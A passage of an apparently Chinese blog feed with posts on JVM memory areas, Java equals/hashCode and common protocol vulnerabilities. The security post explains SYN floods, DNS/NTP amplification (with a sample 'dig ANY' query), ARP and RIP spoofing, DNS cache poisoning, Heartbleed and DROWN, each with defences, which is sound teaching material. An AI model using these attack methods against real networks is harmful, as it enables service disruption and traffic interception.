内。线程共享区域随虚拟机的启动&#x2F;关闭而创建&#x2F;销毁</p><h3 id="程序计数器（线程私有）"><a href="#程序计数器（线程私有）" class="headerlink" title="程序计数器（线程私有）"></a>程序计数器（线程私有）</h3><p>一块比较小的内存空间，是当前线程所执行的字节码的行号指示器（如果是Native方法，则为空），每条线程都有一个独立的程序计数器，这类内存也成为“线程私有内存”。</p><p>该区域没有规定任何OutOfMemoryError情况</p><h3 id="虚拟机栈（线程私有）"><a href="#虚拟机栈（线程私有）" class="headerlink" title="虚拟机栈（线程私有）"></a>虚拟机栈（线程私有）</h3><p>是描述Java方法执行的内存模型，每个方法在执行的同时都会创建一个栈帧（Stack Frame）<br>用于存储局部变量表、操作数栈、动态链接、方法出口等信息。 每一个方法从调用直至执行完成<br>的过程，就对应着一个栈帧在虚拟机栈中入栈到出栈的过程。</p><p><img src="/images/jvmstack.png"></p><h3 id="本地方法区（线程私有）"><a href="#本地方法区（线程私有）" class="headerlink" title="本地方法区（线程私有）"></a>本地方法区（线程私有）</h3><p>本地方法区与Java Stack作用类似，区别是虚拟机栈为执行Java方法服务，本地方法栈为Native方法服务，如果虚拟机实现使用C-linkage模型来支持Native调用，那么该栈将会是C栈，但HotSpot VM直接就吧本地方法栈和虚拟机栈合二为一。</p><h3 id="堆区（线程共享）-运行时的数据区"><a href="#堆区（线程共享）-运行时的数据区" class="headerlink" title="堆区（线程共享）-运行时的数据区"></a>堆区（线程共享）-运行时的数据区</h3><p>创建的对象和数组都保存在Java堆内存中，也是垃圾回收器进行垃圾收集的最重要的内存区域。由于现代VM采用分代收集算法，因此Java堆从垃圾回收的角度可以分为：新生代（Eden区、From Survivor区和To Survivor区）和老年代。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一些常见协议及其漏洞分析</title>
    <link href="/blog/2023/02/19/%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E5%8D%8F%E8%AE%AE%E5%8F%8A%E5%85%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/blog/2023/02/19/%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E5%8D%8F%E8%AE%AE%E5%8F%8A%E5%85%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>网络协议是一套已建立的规则，通过遵循一种安全，可靠和简单的方法来控制和控制信息的交换。这些规则集适用于各种应用程序。协议的一些知名示例包括有线网络（如以太网），无线网络（如WLAN）和Internet通信。用于在Internet上广播和传输数据的Internet协议套件包括数十种协议。</p><p><strong>这些协议中存在许多漏洞，这些漏洞导致它们被积极利用，并对网络安全提出了严峻挑战。</strong></p><span id="more"></span><h2 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h2><p>TCP连接和释放的过程之前有记录过：<a href="https://chujian521.github.io/blog/2020/11/18/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AAhttps%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%95%85%E4%BA%8B/#TCP%E8%BF%9E%E6%8E%A5%E5%BB%BA%E7%AB%8B%E8%A7%A3%E9%99%A4">TCP连接的建立与解除</a></p><h3 id="SYN泛洪"><a href="#SYN泛洪" class="headerlink" title="SYN泛洪"></a>SYN泛洪</h3><p>SYN攻击利用的是TCP的三次握手机制，攻击端利用伪造的IP地址向被攻击端发出请求，而被攻击端发出的响应报文将永远发送不到目的地，那么被攻击端在等待关闭这个连接的过程中消耗了资源，如果有成千上万的这种连接，主机资源将被耗尽，从而达到攻击的目的。</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>如果在TCP的三步握手中，只进行前两步握手，在服务器端等待客户端确认时客户端不回送ACK数据包建立连接，那么此时服务器就处于“半连接”状态，这个过程会持续数分钟左右，如果大量这样的情况出现，对服务端来说就不堪重负了，维护这些半连接是需要消耗很多服务器的网络连接资源，如果短时间内这些资源几乎都被半连接占满，那么正常的业务请求在这期间就得不到服务，处于等待状态。</p><h4 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h4><ol><li>降低SYN timeout时间，使得主机尽快释放半连接的占用；</li><li>采用SYN cookie设置，如果短时间内连续收到某个IP的重复SYN请求，则认为受到了该IP的攻击，丢弃来自该IP的后续请求报文。</li><li>合理地采用防火墙等外部网络安全设施也可缓解SYN泛洪攻击。</li></ol><h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><h4 id="DoS拒绝服务流量放大方法"><a href="#DoS拒绝服务流量放大方法" class="headerlink" title="DoS拒绝服务流量放大方法"></a>DoS拒绝服务流量放大方法</h4><p>放大攻击的原理是利用第三方设备，使网络流量压倒目标。 对于多数放大攻击，必须满足两个条件：</p><ul><li>用于执行攻击的协议不验证请求源</li><li>来自所使用的网络功能的响应应该显着大于用于请求它的请求。</li></ul><p>满足以上条件的协议有：</p><ol><li>DNS放大：DNS查询请求流量小，但是响应流量可能非常巨大，Linux下使用<code>dig ANY baidu.com @8.8.8.8</code>查询，流量放大8倍左右</li><li>简单网络管理协议SNMP，服务端口为UDP 161&#x2F;162</li><li>网络时间协议NTP，用于同步网络设备时间，服务端口为UDP 123，NTP服务支持monlist查询功能，客户端查询时服务器会返回最后同步时间的600个客户端IP，流量约放大100倍</li></ol><h4 id="DDos"><a href="#DDos" class="headerlink" title="DDos"></a>DDos</h4><p>DDos是分布式拒绝服务攻击，比较完善的DDos攻击体系分为四大部分，分别是攻击者、控制傀儡机、攻击傀儡机和受害者，第二和第三部分分别被用作控制和实际发起攻击。</p><ul><li>SYN Flood：如上</li><li>TCP全连接：为了绕过常规防火墙检查，常规的TCP连接防火墙不会拦截，TCP全连接通过许多僵尸主机不断与受害者服务器建立大量TCP连接，直到服务器内存等资源被耗尽</li><li>提交大量GET or POST指令，耗费服务器数据库等查询资源，缺点是针对静态页面效果大打折扣，并且有些代理会暴露DDos攻击者的IP</li></ul><p>防护策略：</p><ul><li>尽量不使用NAT、升级主机和网络设备性能</li><li>对异常流量进行清洗和过滤，通过数据包规则过滤、数据流指纹检测过滤、数据包内容过滤等判断流量是否异常</li><li>分布式集群防御</li></ul><h2 id="地址解析协议ARP"><a href="#地址解析协议ARP" class="headerlink" title="地址解析协议ARP"></a>地址解析协议ARP</h2><h3 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h3><p>ARP欺骗攻击的工作原理是通过伪造通信双方一端的IP地址或 MAC 地址，让另一端误以为该主机为正确主机从而达到欺骗目的。</p><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p><img src="/images/arpqipian.png"></p><p>当网络中源主机A想和目的主机 B 进行通信，A会先广播ARP请求报文，期望B能收到并返回给A自己的 MAC 地址。但由于报文采用的是广播形式，因此攻击者 C在收到A的请求报文时会将自己的IP地址伪造成B的IP地址，这在 ARP请求报文中可以很容易获得，接着攻击者C向发送带有 B 的IP地址，C的 MAC地址的返回消息，让A误以为C就是合法的目的主机 B，从而攻击者C就达到了盗取AB之间的通信信息的目的。</p><h4 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h4><ol><li>双向绑定：在小规模网络中，比较推荐使用双向绑定，也就是在路由器和终端上都进行IP-MAC绑定的措施。</li><li>ARP防火墙：通过在终端电脑上对网关进行绑定，保证不受网络中假网关的影响，从而保护自身数据不被窃取的措施。但是它不能保证绑定的网关一定是正确的，如果网络中已经发生了ARP欺骗，ARP防火墙绑定的就是错误的网关</li><li>划分VLAN，减少广播域范围，防止发生大范围的影响。</li><li>在交换机上配置防网关冲突功能（该功能要求交换机必须做网关），ARP网关冲突防攻击功能使能后，系统生成ARP防攻击表项，在后续一段时间内对收到具有相同源MAC地址的报文直接丢弃，这样可以防止与网关地址冲突的ARP报文在VLAN内广播。</li></ol><h2 id="路由信息协议RIP"><a href="#路由信息协议RIP" class="headerlink" title="路由信息协议RIP"></a>路由信息协议RIP</h2><p>RIP是一种基于距离矢量（Distance-Vector）算法的协议，它使用跳数（Hop Count）作为度量值来衡量到达目的地址的距离。度量值等于从本网络到达目的网络间的设备数量。大于或等于16的跳数被定义为无穷大，即目的网络或主机不可达。RIP通过UDP报文进行路由信息的交换，使用的端口号为520。</p><h3 id="RIP路由欺骗"><a href="#RIP路由欺骗" class="headerlink" title="RIP路由欺骗"></a>RIP路由欺骗</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>运行着 RIP 协议的路由器会无条件的接受任何来自网路中的报文，包括一些非法的路由表更新报文。路由器在接受这些报文时会在没有执行路由表更新命令的情况下改变自身的路由表。从而导致该路由器的路由表紊乱，甚至可能影响该路由器的邻接路由器，继而导致整个网络瘫痪，带来严重的后果。</p><h4 id="防范措施-1"><a href="#防范措施-1" class="headerlink" title="防范措施"></a>防范措施</h4><ol><li>升级到RIPv2，RIPv2 协议能够通过更新消息所包含的口令来验证某个路由选择消息源的合法性，但是认证的口令是明文的简单验证</li></ol><h2 id="域名系统DNS"><a href="#域名系统DNS" class="headerlink" title="域名系统DNS"></a>域名系统DNS</h2><p>DNS主要是负责把域名解析为IP（UDP 53端口）</p><p>DNS在进行区域传输的时候使用TCP协议,其它时候则使用UDP协议。</p><p>注：为什么区域传送要使用TCP呢？1.辅助域名服务器会定时(一般是3小时)向主域名服务器进行查询以便了解数据是否有变动。如有变动，则会执行一次区域传送，进行数据同步。区域传送将使用TCP而不是UDP，因为数据同步传送的数据量比一个请求和应答的数据量要多得多。2.TCP是一种可靠的连接，保证了数据的准确性。</p><p>传统的DNS解析主要涉及Stub Resolver（存根解析器）、Recursive Resolver（递归解析器）和Authoritative Resolver（权威域名解析器）</p><p>权威域名解析器能够从自己的数据满足查询，而不需要引用其他来源，即能够给出DNS查询请求的权威应答</p><p>递归解析器则是通过询问其他域名服务器获取答案，递归解析器最后能够权威域名解析器得到查询响应</p><p>根据DNS协议的初始标准，当域名需要解析时，DNS客户端向递归解析器发送查询请求，递归解析器会从权威域名解析获取答案，然后将结果返回给客户端。</p><h3 id="DNS缓存中毒"><a href="#DNS缓存中毒" class="headerlink" title="DNS缓存中毒"></a>DNS缓存中毒</h3><p>DNS缓存中毒也称为DNS欺骗，是一种攻击，旨在查找并利用DNS或域名系统中存在的漏洞，以便将有机流量从合法服务器吸引到虚假服务器上。这种攻击往往被归类为域欺骗攻击(pharming attack)，由此它会导致出现很多严重问题。用户往往会以为登录的是自己熟悉的网站，而它们却并不是。与钓鱼攻击采用非法URL不同的是，这种攻击使用的是合法的URL地址。</p><h4 id="DNSpooq"><a href="#DNSpooq" class="headerlink" title="DNSpooq"></a>DNSpooq</h4><p><a href="https://github.com/knqyf263/dnspooq">GitHub - knqyf263&#x2F;dnspooq: DNSpooq - dnsmasq cache poisoning (CVE-2020-25686, CVE-2020-25684, CVE-2020-25685)</a></p><p><img src="/images/DNSpooq.png"></p><p>首先先开启3个容器，分别是attack（攻击机器），forwarder（DNS转发器），cache server（DNS服务器）</p><ol><li><p>攻击机器向转发器发送大量查询报文</p></li><li><p>转发器向服务器查询解析域名</p></li><li><p>攻击机器伪装成服务器，向转发器回复构造后的响应报文，并实现投毒</p></li></ol><p>为了进行DNS缓存中毒，需要两个数据：</p><ul><li>QID</li><li>UDP源端口（需要注意，53是DNS协议端口，并非此处提到的源端口）</li></ul><p>这两个数据都是随机的，因此都是需要爆破的，每个16位，共计需要爆破2^32次方次，实际情况下留给攻击者的时间一般不超过2s，因此实际很难进行攻击</p><h4 id="防范措施-2"><a href="#防范措施-2" class="headerlink" title="防范措施"></a>防范措施</h4><ol><li><p>DNS服务器应该配置为尽可能少地依赖与其他DNS服务器的信任关系。以这种方式配置将使攻击者更难以使用他们自己的DNS服务器来破坏目标服务器。</p></li><li><p>企业应该设置DNS服务器，只允许所需的服务运行。因为在DNS服务器上运行不需要的其他服务，只会增加攻击向量大小。</p></li><li><p>安全人员还应确保使用最新版本的DNS。较新版本的BIND具有加密安全事务ID和端口随机化等功能，可以帮助防止缓存中毒攻击。</p></li><li><p>用户的安全教育对于防止这些攻击也非常重要。用户应接受有关识别可疑网站的培训，用户要学会只访问HTTPS网站，这有助于防止人们成为中毒攻击的受害者，因为他们会确保不将他们的个人信息输入黑客的网站。如果他们在连接到网站之前收到SSL警告，则不会单击“忽略”按钮。 这样就不会受到DNS缓存中毒攻击。</p></li></ol><h2 id="超文本传输协议-x2F-安全的-HTTP-x2F-S"><a href="#超文本传输协议-x2F-安全的-HTTP-x2F-S" class="headerlink" title="超文本传输协议&#x2F;安全的 HTTP&#x2F;S"></a>超文本传输协议&#x2F;安全的 HTTP&#x2F;S</h2><p>HTTP是一个基于请求与响应模式的、无状态的应用层协议。<br>常基于TCP的连接方式 ，即http是将数据打包成TCP数据包来进行传送的，绝大多数Web应用，都是构建在HTTP协议之上，即目前使用浏览器访问web网站都是以http协议为标准的。</p><h3 id="HTTP协议的缺陷"><a href="#HTTP协议的缺陷" class="headerlink" title="HTTP协议的缺陷"></a>HTTP协议的缺陷</h3><h4 id="明文传输"><a href="#明文传输" class="headerlink" title="明文传输"></a>明文传输</h4><p>通信使用明文可能会被窃听</p><h4 id="防范措施-3"><a href="#防范措施-3" class="headerlink" title="防范措施"></a>防范措施</h4><p>使用HTTPS</p><h3 id="SSL-心脏滴血漏洞"><a href="#SSL-心脏滴血漏洞" class="headerlink" title="SSL 心脏滴血漏洞"></a>SSL 心脏滴血漏洞</h3><h4 id="心跳协议"><a href="#心跳协议" class="headerlink" title="心跳协议"></a>心跳协议</h4><p>目的：及时检测连接状态问题</p><p>过程：通过发送特定的数据包Heartbeat给服务器，来查看服务器是否在线，当服务器在线时，会发送回复信息给主机，然后允许进行安全通信，此外，服务器、主机会间断性发送该信号确保彼此在线。</p><h4 id="Heartbleed漏洞"><a href="#Heartbleed漏洞" class="headerlink" title="Heartbleed漏洞"></a>Heartbleed漏洞</h4><p>产生原因：<strong>OpenSSL代码实现中的心跳处理逻辑没有检测心跳包中的长度字段是否和后续的数据字段相符合</strong>，攻击者能够利用Heartbeat构造异常数据包发送给服务器，<strong>读取心跳数据所在的内存区域的后续数据</strong>，一次可以收到64KB的服务器内存数据。多次请求，则能够得到更多的服务器内存信息。</p><h3 id="DROWN漏洞"><a href="#DROWN漏洞" class="headerlink" title="DROWN漏洞"></a>DROWN漏洞</h3><p>“DROWN”全称是 Decrypting RSA with Obsolete and Weakened eNcryption，是指”利用过时的脆弱加密算法来对RSA算法进破解”，主要针对SSLv2协议漏洞来对TLS进行跨协议攻击。</p><p>  “DROWN攻击”主要影响支持SSLv2的服务端和客户端。SSLv2是一种古老的协议，许多客户端已经不支持使用，但由于配置上的问题，可能有服务器仍然支持SSLv2。</p><p>“DROWN”使得攻击者可以通过发送probe到支持SSLv2的使用相同密钥的服务端和客户端解密TLS通信。例如：将相同的私钥同时用在Web服务端和Email服务端，如果Email服务支持SSLv2，但web服务不支持，那么攻击者仍然能够利用EMAIL服务的SSLv2漏洞获取到web服务器的TLS连接数据。</p><h4 id="防范措施-4"><a href="#防范措施-4" class="headerlink" title="防范措施"></a>防范措施</h4><ol><li>不要用相同的私钥生成多张SSL证书，也不要将同一张SSL证书部署在多台服务器上</li><li>禁用SSLv2</li></ol><h2 id="IMAP-x2F-POP3-x2F-SMTP"><a href="#IMAP-x2F-POP3-x2F-SMTP" class="headerlink" title="IMAP&#x2F;POP3&#x2F;SMTP"></a>IMAP&#x2F;POP3&#x2F;SMTP</h2><p>MAP能使本地和服务器端邮件同步，你在本地删除或阅读邮件，服务器上也自动删除或显示已读。所以你用outlook和用 webmail看到的内容是一样。 SMTP&#x2F;POP3的邮箱，本地和服务器不同步，本地只会下载服务器上未读的邮件。</p><h3 id="安全缺陷"><a href="#安全缺陷" class="headerlink" title="安全缺陷"></a>安全缺陷</h3><p>这三种协议都是明文传输</p><h3 id="防范措施-5"><a href="#防范措施-5" class="headerlink" title="防范措施"></a>防范措施</h3><p>使用PGP等邮件安全工具进行加密</p><h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><ol><li><strong>服务器建立公钥。</strong>若远程服务器是新系统，会在&#x2F;etc&#x2F;ssh目录下生成一个名为ssh_host_ecdsa_key.pub的公钥，同时生成一个名为ssh_host_ecdsa_key的私钥，这一对就是远程服务器的公钥与私钥。之后每次启动sshd服务的时候，系统会自动在此路径下查找公钥。</li><li><strong>客户端请求连接。</strong></li><li><strong>服务端将发送公钥给客户端。</strong></li><li><strong>客户端记录服务器公钥并计算自己的公私钥。</strong>客户端选择yes接收服务器公钥后，将服务器传来的公钥文件记录在<code>~/.ssh/known_hosts</code>中，然后客户端计算自己的公钥和私钥存放在<code>~/.ssh/</code>目录下。</li><li><strong>客户端发送给服务器公钥，后面就可以使用非对称加密进行通信</strong></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java基础知识复习</title>
    <link href="/blog/2023/02/18/Java%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0/"/>
    <url>/blog/2023/02/18/Java%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p><strong>安全岗位也太少了，很多都是开发岗，也来复习（预习）一下Java的基础知识，以备找不到安全岗位去转开发。</strong></p><span id="more"></span><h2 id="Java基础概念与常识"><a href="#Java基础概念与常识" class="headerlink" title="Java基础概念与常识"></a>Java基础概念与常识</h2><h3 id="Java语言的特点"><a href="#Java语言的特点" class="headerlink" title="Java语言的特点"></a>Java语言的特点</h3><ol><li>面向对象（继承、多态、封装）</li><li>平台无关</li><li>安全可靠</li><li>支持多线程和方便的网络编程</li><li>编译与解释共存（.class-&gt;机器码这一步JVM类加载器首先加载字节码文件，然后通过解释器逐行解释执行，这种方式的执行速度会相对比较慢。而且，有些方法和代码块是经常需要被调用的(也就是所谓的热点代码)，所以后面引进了JIT编译器，而JIT属于运行时编译。当JIT编译器完成第一次编译后，其会将字节码对应的机器码保存下来，下次可以直接使用。而我们知道，机器码的运行效率肯定是高于Java解释器的。这也解释了我们为什么经常会说Java是编译与解释共存的语言。）</li></ol><h3 id="import-java-和-javax的区别"><a href="#import-java-和-javax的区别" class="headerlink" title="import java 和 javax的区别"></a>import java 和 javax的区别</h3><p>一开始JavaAPI所必需的包是java开头的包，javax是当时的扩展包，后来javax成为JavaAPI的组成部分，由于将javax移动到java很麻烦，因此将javax包也成为了标准API的一部分</p><h3 id="Java基本类型占存储空间大小"><a href="#Java基本类型占存储空间大小" class="headerlink" title="Java基本类型占存储空间大小"></a>Java基本类型占存储空间大小</h3><p><img src="/images/javadatatype.png"></p><h3 id="Java中常见的关键字"><a href="#Java中常见的关键字" class="headerlink" title="Java中常见的关键字"></a>Java中常见的关键字</h3><p><img src="/images/javaKeyWords.png"></p><h3 id="hashCode-与-equals"><a href="#hashCode-与-equals" class="headerlink" title="hashCode() 与 equals()"></a>hashCode() 与 equals()</h3><h4 id="equals方法"><a href="#equals方法" class="headerlink" title="equals方法"></a>equals方法</h4><p>Object 类中的 equals 方法用于检测一个对象是否等于另外一个对象。在 Object 类中，这个方法将判断两个对象是否具有相同的引用。如果两个对象具有相同的引用，它们一定是相等的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//equals方法实现的源码</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object obj)</span> &#123;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-built_in">this</span> == obj);<br>&#125;<br></code></pre></td></tr></table></figure><p>因此通常情况下，我们要判断两个对象是否相等，一定要重写 equals 方法。</p><h4 id="hashCode方法"><a href="#hashCode方法" class="headerlink" title="hashCode方法"></a>hashCode方法</h4><p>hashCode 翻译为中文是散列码，它是由对象推导出的一个整型值，并且这个值为任意整数，包括正数或负数。需要注意的是：散列码是没有规律的。如果 x 和 y 是两个不同的对象，x.hashCode() 与 y.hashCode() 基本上不会相同；但如果 a 和 b 相等，则 a.hashCode() 一定等于 b.hashCode()。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//hashCode 在 Object 中的源码如下</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span>;<br></code></pre></td></tr></table></figure><p>从上述源码可以看到，Object 中的 hashCode 调用了一个（native）本地方法，返回了一个 int 类型的整数，当然，这个整数可能是正数也可能是负数。</p><p>相等的值hashCode一定相等，不同的值hashCode也有可能相等</p><h4 id="为什么重写equals方法一定要重写hashCode方法"><a href="#为什么重写equals方法一定要重写hashCode方法" class="headerlink" title="为什么重写equals方法一定要重写hashCode方法"></a>为什么重写equals方法一定要重写hashCode方法</h4><p>举一个Set的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.Objects;<br><span class="hljs-keyword">import</span> java.util.Set;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EqualsToListExample</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// 对象 1</span><br>        <span class="hljs-type">Persion</span> <span class="hljs-variable">p1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Persion</span>();<br>        p1.setName(<span class="hljs-string">&quot;Java&quot;</span>);<br>        p1.setAge(<span class="hljs-number">18</span>);<br>        <span class="hljs-comment">// 对象 2</span><br>        <span class="hljs-type">Persion</span> <span class="hljs-variable">p2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Persion</span>();<br>        p2.setName(<span class="hljs-string">&quot;Java&quot;</span>);<br>        p2.setAge(<span class="hljs-number">18</span>);<br>        <span class="hljs-comment">// 创建 Set 对象</span><br>        Set&lt;Persion&gt; set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;Persion&gt;();<br>        set.add(p1);<br>        set.add(p2);<br>        <span class="hljs-comment">// 打印 Set 中的所有数据</span><br>        set.forEach(p -&gt; &#123;<br>            System.out.println(p);<br>        &#125;);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Persion</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br> <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object o)</span> &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span> == o) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// 引用相等返回 true</span><br>        <span class="hljs-comment">// 如果等于 null，或者对象类型不同返回 false</span><br>        <span class="hljs-keyword">if</span> (o == <span class="hljs-literal">null</span> || getClass() != o.getClass()) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-comment">// 强转为自定义 Persion 类型</span><br>        <span class="hljs-type">Persion</span> <span class="hljs-variable">persion</span> <span class="hljs-operator">=</span> (Persion) o;<br>        <span class="hljs-comment">// 如果 age 和 name 都相等，就返回 true</span><br>        <span class="hljs-keyword">return</span> age == persion.age &amp;&amp;<br>                Objects.equals(name, persion.name);<br>    &#125;<br> <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// 对比 name 和 age 是否相等</span><br>        <span class="hljs-keyword">return</span> Objects.hash(name, age);<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Persion&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>重写hashCode方法后，运行结果为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">java EqualsToListExample<br>Persion&#123;name=<span class="hljs-string">&#x27;Java&#x27;</span>, age=18&#125;<br></code></pre></td></tr></table></figure><p>注释掉重写部分，运行结果为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">java EqualsToListExample<br>Persion&#123;name=<span class="hljs-string">&#x27;Java&#x27;</span>, age=18&#125;<br>Persion&#123;name=<span class="hljs-string">&#x27;Java&#x27;</span>, age=18&#125;<br></code></pre></td></tr></table></figure><p>出现以上问题的原因是，如果只重写了 equals 方法，那么默认情况下，Set 进行去重操作时，会先判断两个对象的 hashCode 是否相同，此时因为没有重写 hashCode 方法，所以会直接执行 Object 中的 hashCode 方法，而 Object 中的 hashCode 方法对比的是两个不同引用地址的对象，所以结果是 false，那么 equals 方法就不用执行了，直接返回的结果就是 false：两个对象不是相等的，于是就在 Set 集合中插入了两个相同的对象。</p><p>但是，如果在重写 equals 方法时，也重写了 hashCode 方法，那么在执行判断时会去执行重写的 hashCode 方法，此时对比的是两个对象的所有属性的 hashCode 是否相同，于是调用 hashCode 返回的结果就是 true，再去调用 equals 方法，发现两个对象确实是相等的，于是就返回 true 了，因此 Set 集合就不会存储两个一模一样的数据了，于是整个程序的执行就正常了。</p><h3 id="装箱与拆箱"><a href="#装箱与拆箱" class="headerlink" title="装箱与拆箱"></a>装箱与拆箱</h3><p>装箱就是 自动将基本数据类型转换为包装器类型；拆箱就是 自动将包装器类型转换为基本数据类型。</p><p>装箱过程是通过调用包装器的valueOf方法实现的，而拆箱过程是通过调用包装器的 xxxValue方法实现的。（xxx代表对应的基本数据类型）。</p><p>注意：在通过valueOf方法创建Integer对象的时候，如果数值在[-128,127]之间，便返回指向IntegerCache.cache中已经存在的对象的引用；否则创建一个新的Integer对象。创建Boolean对象的时候，直接返回定义好的静态成员属性。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 